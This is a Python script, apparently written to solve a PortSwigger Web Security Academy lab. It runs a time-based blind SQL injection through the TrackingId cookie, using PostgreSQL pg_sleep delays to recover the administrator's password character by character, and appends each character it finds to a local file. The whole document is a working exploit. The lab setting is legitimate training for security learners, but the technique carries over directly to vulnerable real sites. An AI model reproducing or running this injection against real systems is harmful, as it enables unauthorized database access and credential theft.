from requests import get
import time

base_url = 'https://0aca006803ea47d6825ee76300b5004c.web-security-academy.net'
base_url_filter = f'{base_url}/filter?category=Corporate+Gifts'

password_chars = [chr(i) for i in range(97, 123)] + [str(i) for i in range(10)]

for i in range(1,21):
    for char in password_chars:
        start = time.time()
        headers = {
            "Cookie": f"TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,{i},1)='{char}')+THEN+pg_sleep(5)+ELSE+pg_sleep(0)+END+FROM+users--; session=pY4KuDv8VtX62ftaFzSzfe80gfF4DHDM",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0",
        }

        response = get(base_url_filter, headers=headers)
        end = time.time()
        print(f'{i}: {char}')
        delta = end - start
        if delta > 4:
            print(f"\033[92m{i} {char} achou\033[0m")
            with open('senha2.txt', '+a') as f:
                f.write(char)
            break